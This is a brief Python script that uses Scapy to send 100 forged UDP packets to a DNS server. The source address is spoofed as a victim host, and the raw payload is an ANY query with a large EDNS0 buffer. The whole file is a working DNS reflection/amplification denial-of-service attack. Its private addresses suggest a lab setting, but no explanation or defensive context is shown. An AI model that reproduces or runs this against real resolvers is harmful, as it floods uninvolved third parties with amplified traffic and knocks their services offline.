from scapy.all import *
import time

A= "192.168.30.1"
B= "192.168.20.1"
C= "\xc4\x75\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\xff\x00\x01\x00\x00\x29\x23\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
D= RandShort()

for i in range(0, 100):
    spoofed_packet = IP(src=A, dst=B) / UDP(sport=D, dport=53) / C
    send(spoofed_packet)